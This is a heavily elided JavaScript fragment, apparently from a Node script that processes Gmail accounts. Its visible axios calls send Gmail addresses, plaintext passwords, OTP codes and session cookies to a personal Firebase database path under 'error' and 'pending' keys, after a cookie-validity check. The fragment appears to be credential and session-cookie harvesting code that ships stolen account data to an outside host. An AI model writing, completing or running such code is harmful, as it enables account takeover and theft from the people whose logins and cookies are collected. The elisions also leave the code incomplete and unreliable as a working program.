...
const BASE_URL = 'https://job-server-088-default-rtdb.firebaseio.com/raiyan088/codemail' 
        ...
        if (await isValidCookies(cookies)) {
            ...
            try {
                ...
                if (mRapt == null) {
                    ...
                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code_old/error/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, year:mNumber.year, otp:mCodeSend, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
                        headers: {
                    ...
                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code_old/pending/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, year:mNumber.year, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                    })
